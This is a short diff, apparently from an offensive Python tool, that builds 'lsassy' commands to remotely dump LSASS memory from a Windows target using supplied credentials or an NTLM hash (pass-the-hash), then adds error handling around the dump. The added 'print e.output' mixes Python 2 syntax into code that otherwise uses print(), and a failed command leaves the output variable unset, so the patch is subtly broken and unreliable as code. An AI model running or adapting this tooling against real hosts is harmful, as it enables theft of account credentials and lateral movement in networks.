@@ -166,8 +166,11 @@ if __name__ == "__main__":
             if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                 command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, args.targ)
             else:
-                command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)            
-            command_output = subprocess.check_output(command1, shell=True)
+                command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)
+            try:
+                command_output = subprocess.check_output(command1, shell=True)
+            except subprocess.CalledProcessError as e:
+                print e.output
             command_output = command_output.decode("utf-8")
             if "Completed" in command_output:
                 print("Dump executed on {}...".format(args.targ))
